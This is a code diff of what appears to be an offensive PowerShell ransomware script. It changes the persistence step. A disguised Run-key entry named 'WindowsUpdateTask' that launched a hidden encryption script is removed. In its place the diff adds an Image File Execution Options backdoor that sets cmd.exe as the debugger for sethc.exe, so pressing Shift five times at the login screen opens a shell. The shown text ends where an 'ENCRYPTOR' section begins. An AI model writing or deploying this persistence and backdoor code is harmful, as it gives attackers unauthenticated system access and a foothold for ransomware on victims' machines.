@@ -1,18 +1,22 @@
-# --- NEW: PERSISTENCE MECHANISM ---
-Write-Host "[*] Establishing persistence..." -ForegroundColor Gray
+# --- PERSISTENCE: IMAGE FILE EXECUTION OPTIONS BACKDOOR ---
+Write-Host "[*] Establishing permanent foothold (IFEO)..." -ForegroundColor Gray
 
-# Disguising the malware as a system update task in the Registry
-$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$PayloadPath = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PWD\encrypt.ps1`""
+$RegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
 
 try {
-    New-ItemProperty -Path $RegistryPath -Name "WindowsUpdateTask" -Value $PayloadPath -PropertyType String -Force | Out-Null
-    Write-Host "[+] Persistence established: HKCU\...\Run\WindowsUpdateTask" -ForegroundColor Cyan
+    # Check if path exists, create if not
+    if (-not (Test-Path $RegistryPath)) {
+        New-Item -Path $RegistryPath -Force | Out-Null
+    }
+    
+    # Set the 'debugger' to cmd.exe. Now hitting SHIFT 5x opens a backdoor.
+    New-ItemProperty -Path $RegistryPath -Name "Debugger" -Value "cmd.exe" -PropertyType String -Force | Out-Null
+    
+    Write-Host "[+] Backdoor installed. Access via Shift x5 at Login Screen." -ForegroundColor Cyan
 } catch {
-    Write-Host "[-] Failed to set persistence." -ForegroundColor Red
+    Write-Host "[-] Persistence failed (Requires Admin)." -ForegroundColor Red
 }
 
-Write-Host "[*] Provisioning attack tools..." -ForegroundColor Gray
 
 # --- 1. THE ENCRYPTOR (File-Only Mode) ---
 $encCode = '
